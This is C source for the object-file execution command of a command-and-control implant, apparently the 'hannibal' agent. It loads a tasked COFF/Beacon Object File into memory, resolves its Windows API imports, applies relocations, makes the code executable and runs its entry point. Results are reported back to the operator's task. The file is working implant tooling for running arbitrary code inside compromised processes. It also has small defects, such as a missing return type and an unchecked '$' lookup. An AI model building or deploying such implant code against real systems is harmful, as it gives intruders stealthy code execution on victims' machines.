#include "BeaconApi.h"
#include "config.h"

#ifdef INCLUDE_CMD_EXECUTE_BOF

#include "hannibal_tasking.h"

#define breakpoint()  asm volatile ("int 3; nop")

#define SIZE_OF_PAGE     0x1000
#define PAGE_ALIGN( x ) (((ULONG_PTR)x) + ((SIZE_OF_PAGE - (((ULONG_PTR)x) & (SIZE_OF_PAGE - 1))) % SIZE_OF_PAGE))

typedef struct _SECTION_MAP {
	PVOID Base;
	ULONG Size;
} SECTION_MAP, *PSECTION_MAP; 

typedef struct _OBJECT_CTX {
	union {
		ULONG_PTR Base;
		PIMAGE_FILE_HEADER Header;
	};

	PIMAGE_SYMBOL SymTbl;
	PVOID* SymMap;
	PSECTION_MAP SecMap;
	PIMAGE_SECTION_HEADER Sections;
} OBJECT_CTX, *POBJECT_CTX;

SECTION_CODE PVOID ObjectResolveSymbol(char* task_uuid, PMESSAGE_QUEUE queue, PSTR Symbol) 
{
	HANNIBAL_INSTANCE_PTR
    PSTR Function = { 0 };
    PSTR Library = { 0 };
    PCHAR Position = { 0 };
    CHAR Buffer[MAX_PATH] = { 0 };
    PVOID Resolved = { 0 };
    PVOID Module = { 0 };
    WCHAR DbgString[256] = { 0 };

	if (!Symbol) {
        return NULL;
    }
		//
	// remove the __imp_ 
	//
	Symbol += 6;

	//
	// check if it is an imported Beacon api 
	//
	if (pic_strncmp("Beacon", Symbol, 6) == 0) {
		if (pic_strcmp("BeaconDataParse", Symbol) == 0) {
			Resolved = BeaconDataParse;
		} else if (pic_strcmp("BeaconDataInt", Symbol) == 0) {
			Resolved = BeaconDataInt;
		} else if (pic_strcmp("BeaconDataShort", Symbol) == 0) {
			Resolved = BeaconDataShort;
		} else if (pic_strcmp("BeaconDataLength", Symbol) == 0) {
			Resolved = BeaconDataLength;
		} else if (pic_strcmp("BeaconDataExtract", Symbol) == 0) {
			Resolved = BeaconDataExtract;
		} else if (pic_strcmp("BeaconOutput", Symbol) == 0) {
			Resolved = BeaconOutput;
		} else if (pic_strcmp("BeaconPrintf", Symbol) == 0) {
			Resolved = BeaconPrintf;
		} else if (pic_strcmp("BeaconAddMessage", Symbol) == 0){
			Resolved = BeaconAddMessage;
		} else if (pic_strcmp("BeaconStrcatW", Symbol) == 0) {
			Resolved = BeaconStrcatW;
		} else if (pic_strcmp("BeaconWsprintf", Symbol) == 0) {
			Resolved = BeaconWsprintf;
		} else if (pic_strcmp("BeaconSprintf", Symbol) == 0) {
			Resolved = BeaconSprintf;
		} else if (pic_strcmp("ParseInt32", Symbol) == 0) {
			Resolved = ParseInt32;
		} else if (pic_strcmp("ParseString", Symbol) == 0) {
			Resolved = ParseString;
		} else if (pic_strcmp("ParseWideString", Symbol) == 0) {
			Resolved = ParseWideString;
		} else if (pic_strcmp("BeaconCharToWideString", Symbol) == 0){
			Resolved = BeaconCharToWideString;
		}
	} else {
		//
		// resolve an imported/external function using
		// the following syntax "LIBRARY$Function"
		//

		//
		// copy the symbol into the buffer 
		//
		pic_memset(Buffer, 0, MAX_PATH);
		pic_memcpy(Buffer, Symbol, pic_strlen(Symbol));

		//
		// repSlace the $ with a null byte 
		//
		Position = pic_strchr(Buffer, '$');
		*Position = 0;

		Library = Buffer;
		Function = Position + 1;

		//
		// resolve the library instance
		// from the symbol string
		//
		if (!(Module = hannibal_instance_ptr->Win32.GetModuleHandleA(Library))) {
			if (!(Module = hannibal_instance_ptr->Win32.LoadLibraryA(Library))) {
				// printf("[!] Module not found: %s\n", Library);
			pic_wsprintf(DbgString, L"[!] Module not found: %s\n", Library);
			// pic_strcatW(buffer_message, DbgString);
			BeaconAddMessageToQueue(queue, DbgString);
	
			return NULL;
			}
		}

		//
		// resolve function from the loaded library 
		//
		if (!(Resolved = hannibal_instance_ptr->Win32.GetProcAddress(Module, Function))) {
			// printf("[!] Function not found inside of %s: %s\n", Library, Function);
			pic_wsprintf(DbgString, L"[!] Function not found inside of %s: %s\n", Library, Function);
			// pic_strcatW(buffer_message, DbgString);
			BeaconAddMessageToQueue(queue, DbgString);
			return NULL;
		}
	}

	// printf(" -> %s @ %p\n", Symbol, Resolved);
	// pic_wsprintf(DbgString, L" -> %s @ %p\n", Symbol, Resolved);
	// hannibal_response(DbgString, task_uuid);
	
	pic_RtlSecureZeroMemory(Buffer, sizeof(Buffer));
	// pic_memset(Buffer, 0, sizeof(Buffer));

	return Resolved; 
}

/**
	* @brief
	* calculate the size of virtual memory we need to
	* allocate for the sections and executable code 
	*
	* @param ObjCtx
	* the context of the object file which contains the
	* base address/header, symbol table, and sections.
	*
	* @return
	* required virtual size to allocate
	*/
SECTION_CODE ULONG ObjectVirtualSize(char *task_uuid, POBJECT_CTX ObjCtx) {
	HANNIBAL_INSTANCE_PTR 

	PIMAGE_RELOCATION ObjRel = { 0 };
	PIMAGE_SYMBOL ObjSym = { 0 };
	PSTR Symbol = { 0 };
	ULONG Length = { 0 };

	//
	// calculate the size of sections + align the memory up 
	//
	for (int i = 0; i < ObjCtx->Header->NumberOfSections; i++) {
		Length += PAGE_ALIGN(ObjCtx->Sections[i].SizeOfRawData);
	}

	//
	// calculate the function map size 
	//
	for (int i = 0; i < ObjCtx->Header->NumberOfSections; i++) {
		ObjRel = (PIMAGE_RELOCATION)(ObjCtx->Base + ObjCtx->Sections[i].PointerToRelocations);

		//
		// iterate over section relocation and retrieve the each symbol
		// to check if it is an import (starting with an __imp_)
		//
		for (int j = 0; j < ObjCtx->Sections[i].NumberOfRelocations; j++) {
			ObjSym = &ObjCtx->SymTbl[ObjRel->SymbolTableIndex];

			//
			// get the symbol name 
			//
			if (ObjSym->N.Name.Short) {
				//
				// short name (8 bytes)
				//
				Symbol = (PSTR)ObjSym->N.ShortName;
			}
			else {
				//
				// long name (over 8 bytes) so we get to get
				// the symbol string via its offset 
				//
				Symbol = (PSTR)((ULONG_PTR)(ObjCtx->SymTbl + ObjCtx->Header->NumberOfSymbols) + (ULONG_PTR)ObjSym->N.Name.Long);
			}

			//
			// check if the symbol starts with an __imp_
			//
			if (pic_strncmp("__imp_", Symbol, 6) == 0) {
				Length += sizeof(PVOID);
			}

			//
			// handle next relocation item/symbol
			//
			ObjRel = (PVOID)((ULONG_PTR)ObjRel + sizeof(IMAGE_RELOCATION));
		}
	}

	return PAGE_ALIGN(Length);
}



SECTION_CODE VOID ObjectRelocation(char *task_uuid, ULONG Type,  PVOID Reloc,  PVOID SecBase) {
	HANNIBAL_INSTANCE_PTR	

	ULONG32 Offset32 = { 0 };
	ULONG64 Offset64 = { 0 };

	switch (Type)
	{
	case IMAGE_REL_AMD64_REL32:
		*(PUINT32) Reloc = (*(PUINT32)(Reloc)) + (ULONG)((ULONG_PTR)SecBase - (ULONG_PTR)Reloc - sizeof(UINT32));
		break;

	case IMAGE_REL_AMD64_REL32_1:
		*(PUINT32)Reloc = (*(PUINT32)(Reloc)) + (ULONG)((ULONG_PTR)SecBase - (ULONG_PTR)Reloc - sizeof(UINT32) - 1);
		break;

	case IMAGE_REL_AMD64_REL32_2:
		*(PUINT32)Reloc = (*(PUINT32)(Reloc)) + (ULONG)((ULONG_PTR)SecBase - (ULONG_PTR)Reloc - sizeof(UINT32) - 2);
		break;

	case IMAGE_REL_AMD64_REL32_3:
		*(PUINT32)Reloc = (*(PUINT32)(Reloc)) + (ULONG)((ULONG_PTR)SecBase - (ULONG_PTR)Reloc - sizeof(UINT32) - 3);
		break;

	case IMAGE_REL_AMD64_REL32_4:
		*(PUINT32)Reloc = (*(PUINT32)(Reloc)) + (ULONG)((ULONG_PTR)SecBase - (ULONG_PTR)Reloc - sizeof(UINT32) - 4);
		break;

	case IMAGE_REL_AMD64_REL32_5:
		*(PUINT32)Reloc = (*(PUINT32)(Reloc)) + (ULONG)((ULONG_PTR)SecBase - (ULONG_PTR)Reloc - sizeof(UINT32) - 5);
		break;

	case IMAGE_REL_AMD64_ADDR64:
		*(PUINT64)Reloc = (*(PUINT64)(Reloc)) + (ULONG64)SecBase; 
		break;
	}
}

SECTION_CODE BOOL ObjectProcessSection(char* task_uuid, POBJECT_CTX ObjCtx, LPVOID args, int argc, PMESSAGE_QUEUE queue) {
    HANNIBAL_INSTANCE_PTR

	PVOID SecBase = { 0 };
    ULONG SecSize = { 0 };
    PIMAGE_RELOCATION ObjRel = { 0 };
    PIMAGE_SYMBOL ObjSym = { 0 };
    PSTR Symbol = { 0 };
    PVOID Resolved = { 0 };
    PVOID Reloc = { 0 };
    ULONG FnIndex = { 0 };
    WCHAR DbgString[256] = { 0 };

    // Process & relocate the object file sections and process symbols and imported functions
    for (int i = 0; i < ObjCtx->Header->NumberOfSections; i++) {
        ObjRel = (PIMAGE_RELOCATION)(ObjCtx->Base + ObjCtx->Sections[i].PointerToRelocations);

        // Iterate over section relocation and retrieve each symbol
        for (int j = 0; j < ObjCtx->Sections[i].NumberOfRelocations; j++) {
            ObjSym = &ObjCtx->SymTbl[ObjRel->SymbolTableIndex];

            // Get the symbol name
            if (ObjSym->N.Name.Short) {
                // Short name (8 bytes)
                Symbol = (PSTR)ObjSym->N.ShortName;
            } else {
                // Long name (over 8 bytes)
                Symbol = (PSTR)((ULONG_PTR)(ObjCtx->SymTbl + ObjCtx->Header->NumberOfSymbols) + 
                              (ULONG_PTR)ObjSym->N.Name.Long);
            }

            Reloc = (PVOID)((ULONG_PTR)ObjCtx->SecMap[i].Base + ObjRel->VirtualAddress);
            Resolved = NULL;

            // Check if the symbol starts with __imp_
            if (pic_strncmp("__imp_", Symbol, 6) == 0) {
                // Resolve the imported function
                if (!(Resolved = ObjectResolveSymbol(task_uuid, queue, Symbol))) {
                    // pic_wsprintf(DbgString, L"[!] ObjectResolveSymbol failed to resolve symbol: %s\n", Symbol);
                    // pic_strcatW(buffer_message, DbgString);

					pic_wsprintf(DbgString, L"[!] ObjectResolveSymbol failed to resolve symbol: %s\n", Symbol);
					BeaconAddMessageToQueue(queue, DbgString);
                    return FALSE;
                }
            }

            // Perform relocation on the imported function
            if (ObjRel->Type == IMAGE_REL_AMD64_REL32 && Resolved) {
                ObjCtx->SymMap[FnIndex] = Resolved;
                *((PUINT32)Reloc) = (UINT32)(((ULONG_PTR)ObjCtx->SymMap + FnIndex * sizeof(PVOID)) - 
                                            (ULONG_PTR)Reloc - sizeof(UINT32));
                FnIndex++;
            } else {
                SecBase = ObjCtx->SecMap[ObjSym->SectionNumber - 1].Base;
                // Perform relocation on the section
                ObjectRelocation(task_uuid, ObjRel->Type, Reloc, SecBase);
            }

            // Handle next relocation item/symbol
            ObjRel = (PVOID)((ULONG_PTR)ObjRel + sizeof(IMAGE_RELOCATION));
        }
    }

    return TRUE;
}

SECTION_CODE ObjectExecute(char* task_uuid, POBJECT_CTX ObjCtx, PSTR Entry, LPVOID args, int argc, LPVOID file_args, PMESSAGE_QUEUE queue) {
    HANNIBAL_INSTANCE_PTR
	
	VOID(*Main)(PBYTE, ULONG, LPVOID, PMESSAGE_QUEUE) = NULL;
    PIMAGE_SYMBOL ObjSym = { 0 };
    PSTR Symbol = { 0 };
    PVOID SecBase = { 0 };
    ULONG SecSize = { 0 };
    ULONG Protect = { 0 };
    WCHAR DbgString[256] = { 0 };

    for (int i = 0; i < ObjCtx->Header->NumberOfSymbols; i++) {
        ObjSym = &ObjCtx->SymTbl[i];

        // Get the symbol name
        if (ObjSym->N.Name.Short) {
            // Short name (8 bytes)
            Symbol = (PSTR)ObjSym->N.ShortName;
        } else {
            // Long name (over 8 bytes)
            Symbol = (PSTR)((ULONG_PTR)(ObjCtx->SymTbl + ObjCtx->Header->NumberOfSymbols) + 
                          (ULONG_PTR)ObjSym->N.Name.Long);
        }

        // Check if it is a function defined inside of the object file
        if (ISFCN(ObjCtx->SymTbl[i].Type) && pic_strcmp(Symbol, Entry) == 0) {
            // Get the section and change it to be executable
            SecBase = ObjCtx->SecMap[ObjSym->SectionNumber - 1].Base;
            SecSize = ObjCtx->SecMap[ObjSym->SectionNumber - 1].Size;

            // Make the section executable
            if (!hannibal_instance_ptr->Win32.VirtualProtect(SecBase, SecSize, PAGE_EXECUTE_READ, &Protect)) {
                pic_wsprintf(DbgString, L"[!] VirtualProtect Failed with Error: %ld\n", 
                           hannibal_instance_ptr->Win32.GetLastError());
				BeaconAddMessageToQueue(queue, DbgString);
                break;
            }

            // Execute the BOF entry point
            Main = (PVOID)((ULONG_PTR)(SecBase) + ObjSym->Value);
            Main((PBYTE)args, argc, file_args, queue);

            // Revert the old section protection
            if (!hannibal_instance_ptr->Win32.VirtualProtect(SecBase, SecSize, Protect, &Protect)) {
                pic_wsprintf(DbgString, L"[!] VirtualProtect Failed with Error: %ld\n", 
                           hannibal_instance_ptr->Win32.GetLastError());
				BeaconAddMessageToQueue(queue, DbgString);
                break;
            }
            return TRUE;
        }
    }
    return FALSE;
}

SECTION_CODE BOOL ObjectLdr(char* task_uuid, PBYTE pObject, PBYTE args, int argc, LPVOID file_args, PMESSAGE_QUEUE queue, PSTR sFunction)
{
	HANNIBAL_INSTANCE_PTR	

    OBJECT_CTX ObjCtx = { 0 };
    ULONG VirtSize = { 0 };
    PVOID VirtAddr = { 0 };
    PVOID SecBase = { 0 };
    ULONG SecSize = { 0 };
    BOOL Success = FALSE;
    WCHAR DbgString[256] = { 0 };
	
	
    if (!pObject || !sFunction) {
        return FALSE;
    }

	//
	// parse the header file, symbol table
	// and sections from the object file 
	//

	ObjCtx.Header = (PIMAGE_FILE_HEADER)pObject;
	ObjCtx.SymTbl = (PIMAGE_SYMBOL)((ULONG_PTR)pObject + (ULONG_PTR)ObjCtx.Header->PointerToSymbolTable);
	ObjCtx.Sections = (PIMAGE_SECTION_HEADER)((ULONG_PTR)pObject + sizeof(IMAGE_FILE_HEADER));

#ifdef _M_X64
	//
	// validate that the object file matches
	// the architecture of the current process 
	//
	if (ObjCtx.Header->Machine != IMAGE_FILE_MACHINE_AMD64) {
		// printf("[*] object file is not x64");
		BeaconAddMessageToQueue(queue, L"[*] object file is not x64");
		return FALSE;
	}
#else
	// puts("[!] Do not support x86");
	pic_wsprintf(DbgString, L"[!] Do not support x86");
	pic_strcatW(buffer_message, DbgString);
	return FALSE;
#endif
	
	VirtSize = ObjectVirtualSize(task_uuid, &ObjCtx);
	if (!(VirtAddr = hannibal_instance_ptr->Win32.VirtualAlloc(NULL, VirtSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE))) {
		
		// pic_wsprintf(DbgString, L"[!] VirtualAlloc Failed with Error: %ld\n", hannibal_instance_ptr->Win32.GetLastError());
		// // pic_strcatW(buffer_message, DbgString);
		// BeaconAddMessageToQueue(queue, DbgString);
		pic_wsprintf(DbgString, L"[!] VirtualAlloc Failed with Error: %ld\n", hannibal_instance_ptr->Win32.GetLastError());
		BeaconAddMessageToQueue(queue, DbgString);
		goto _END_OF_CODE;
	}

	//
	// allocate heap memory to store
	// the section map array 
	//
	if (!(ObjCtx.SecMap = hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->Win32.GetProcessHeap(), HEAP_ZERO_MEMORY, ObjCtx.Header->NumberOfSections * sizeof(SECTION_MAP)))) {
		// pic_wsprintf(DbgString, L"[!] HeapAlloc Failed with Error: %ld\n", hannibal_instance_ptr->Win32.GetLastError());
		// pic_strcatW(buffer_message, DbgString);

		pic_wsprintf(DbgString, L"[!] HeapAlloc Failed with Error: %ld\n", hannibal_instance_ptr->Win32.GetLastError());
		BeaconAddMessageToQueue(queue, DbgString);
		goto _END_OF_CODE;
	}

	//
	// set the section base to
	// the allocate memory 
	//
	SecBase = VirtAddr;

	//
	// copy over the sections 
	//
	for (int i = 0; i < ObjCtx.Header->NumberOfSections; i++) {
		ObjCtx.SecMap[i].Size = SecSize = ObjCtx.Sections[i].SizeOfRawData;
		ObjCtx.SecMap[i].Base = SecBase;

		//
		// copy over the section data to
		// the newly allocated memory region
		//
		pic_memcpy(SecBase, (PVOID)(ObjCtx.Base + (ULONG_PTR)ObjCtx.Sections[i].PointerToRawData), SecSize);
		//
		// get the next page entry to write our
		// object data section into
		//
		SecBase = (PVOID)PAGE_ALIGN(((ULONG_PTR)SecBase + SecSize));
	}

	//
	// last page of the object memory is the symbol/function map
	//
	ObjCtx.SymMap = SecBase;

	if (!(Success = ObjectProcessSection(task_uuid, &ObjCtx, args, argc, queue))) {
		// pic_wsprintf(DbgString, L"[!] Failed to process sections\n");
		// pic_strcatW(buffer_message, DbgString);
		pic_wsprintf(DbgString, L"[!] Failed to process sections\n");
		BeaconAddMessageToQueue(queue, DbgString);
		goto _END_OF_CODE;
	}

	if (!(Success = ObjectExecute(task_uuid, &ObjCtx, sFunction, args, argc, file_args, queue))) {
		// pic_wsprintf(DbgString, L"[!] Failed to execute function: %s\n", sFunction);
		// pic_strcatW(buffer_message, DbgString);
		pic_wsprintf(DbgString, L"[!] Failed to execute function: %s\n", sFunction);
		BeaconAddMessageToQueue(queue, DbgString);
		goto _END_OF_CODE;
	}

_END_OF_CODE:
	if (VirtAddr) {
		hannibal_instance_ptr->Win32.VirtualFree(VirtAddr, 0, MEM_RELEASE);
		VirtAddr = NULL;
	}

	if (ObjCtx.SecMap) {
		hannibal_instance_ptr->Win32.HeapFree(hannibal_instance_ptr->Win32.GetProcessHeap(), HEAP_ZERO_MEMORY, ObjCtx.SecMap);
		ObjCtx.SecMap = NULL;
	}

	//
	// clear the struct context from the stack
	//
	pic_RtlSecureZeroMemory(&ObjCtx, sizeof(ObjCtx));
	// pic_memset(&ObjCtx, 0, sizeof(ObjCtx));

	return Success;
}

SECTION_CODE int do_bof(char* task_uuid, PBYTE pbof_content, PBYTE args, int argc, LPVOID file_args, PMESSAGE_QUEUE queue) 
{
	HANNIBAL_INSTANCE_PTR

	int status = FALSE;
	status = ObjectLdr(task_uuid, pbof_content, args, argc, file_args, queue, "go");

    if (!status) {
        // pic_strcatW(buffer_message, L"[!] Failed to execute object file\n");
		BeaconAddMessageToQueue(queue, L"[!] Failed to execute object file\n");
    }
    else {
        // pic_strcatW(buffer_message, L"[+] Successfully executed object file\n");
		BeaconAddMessageToQueue(queue, L"[+] Successfully executed object file\n"); 
    }
    return 0;
}

SECTION_CODE void cleanup_file_args(PFILE_ARGS file_args) {
	HANNIBAL_INSTANCE_PTR
	PFILE_CONTENT current_file = file_args->file_content;
	PFILE_CONTENT next_file = NULL;

	while (current_file != NULL) {
		next_file = current_file->next_file;
		if (current_file->file_content != NULL) {
			hannibal_instance_ptr->Win32.VirtualFree(current_file->file_content, 0, MEM_RELEASE);
		}
		hannibal_instance_ptr->Win32.VirtualFree(current_file, 0, MEM_RELEASE);
		current_file = next_file;
	}
	hannibal_instance_ptr->Win32.VirtualFree(file_args, 0, MEM_RELEASE);
}

SECTION_CODE void cmd_bof(TASK t)
{
	// TODO: must include multiple files.
	HANNIBAL_INSTANCE_PTR
    CMD_EXECUTE_BOF *exec_bof = (CMD_EXECUTE_BOF *)t.cmd;
	PMESSAGE_QUEUE queue = BeaconCreateMessageQueue();
	if (!queue) {
		return;
	}
    // LPCWSTR message_content = (LPCWSTR)hannibal_instance_ptr->Win32.VirtualAlloc(
    //     NULL,
    //     0x1000,
    //     MEM_COMMIT,
    //     PAGE_READWRITE
    // );
	// pic_strcatW(message_content, L"[+] Attempt to execute BOF\n");
    BeaconAddMessageToQueue(queue, L"[+] Attempt to execute BOF\n");
	// Execute BOF directly with parameters
    do_bof(
        t.task_uuid,
        exec_bof->bof,
		exec_bof->args,
        exec_bof->argc,
		exec_bof->file_args,
        queue
    );

    // Cleanup
	cleanup_file_args(exec_bof->file_args);
    hannibal_instance_ptr->Win32.VirtualFree(exec_bof->args, 0, MEM_RELEASE);
    hannibal_instance_ptr->Win32.VirtualFree(exec_bof->bof, 0, MEM_RELEASE);
	// hannibal_instance_ptr->Win32.VirtualFree(exec_bof->file_content, 0, MEM_RELEASE);
	;
	hannibal_instance_ptr->Win32.VirtualFree(t.cmd, 0, MEM_RELEASE);
	// pic_RtlSecureZeroMemory(message_content, sizeof(message_content));
    // hannibal_response(message_content, t.task_uuid);

	// This supposed to clean up the information used.
	BeaconSendAllMessages(queue, t.task_uuid);

	BeaconCleanUpMessageQueue(queue);
}



#endif